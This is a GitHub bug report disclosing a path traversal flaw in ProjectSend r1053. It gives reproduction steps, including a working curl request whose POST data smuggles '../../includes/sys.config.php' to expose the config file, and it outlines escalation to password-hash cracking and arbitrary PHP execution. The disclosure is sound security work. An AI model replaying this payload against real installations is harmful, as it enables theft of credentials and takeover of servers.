## Description

![@lmsilva](https://avatars.githubusercontent.com/u/1707654?v=4&size=48)[lmsilva](https://github.com/lmsilva)opened [on Apr 18, 2019](https://github.com/projectsend/projectsend/issues/700#issue-434577772)
## Type

This is a:

[X] Bug report

### Description of the problem

It is possible for users to read arbitrary files and (potentially) access the supporting database, delete arbitrary files, access user passwords, run arbitrary code.

Watch video for detailed information:

<https://youtu.be/yca1BIDVH-c>

### List the steps to reproduce the issue

1. Upload a file (e.g. hacked.txt)
2. Upload the same file again but don't save it after clicking "Upload"
3. Grab the PHPSESSIONID
4. Run the following curl command:

   curl '<http://192.168.200.183/upload-process-form.php>' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: <http://192.168.200.183>' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Referer: <http://192.168.200.183/upload-process-form.php>' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9,pt;q=0.8,ru;q=0.7,es;q=0.6,pl;q=0.5' -H 'Cookie: PHPSESSID=45h0ndm0sbak7ggcj26e2f0od0' --data 'finished\_files%5B%5D=../../includes/sys.config.php&file%5B1%5D%5Boriginal%5D=../../includes/sys.config.php&file%5B1%5D%5Bfile%5D=hacked.txt&file%5B1%5D%5Bname%5D=own3d&file%5B1%5D%5Bdescription%5D=&upload\_failed=&submit=' --compressed

This will create a file called "own3d" that will point to includes/sys.config.php, meaning the user can now download that file (and delete it if the file is writeable by www-data).

Then, IF the user has access to the MySQL server hosting ProjectSend, user can:

* download and crack password hashes from tbl\_users;
* make changes to tbl\_options like:

  -- allowing for upload of arbitrary file extensions (e.g. php)

  -- changing the client options, allowing clients to delete files

This will allow users to later delete arbitrary files (www-data has write access to) and run arbitrary php code.

### Environment

* ProjectSend version: r1053
* php version: 7.0.33
* MySQL version: 5.7.25
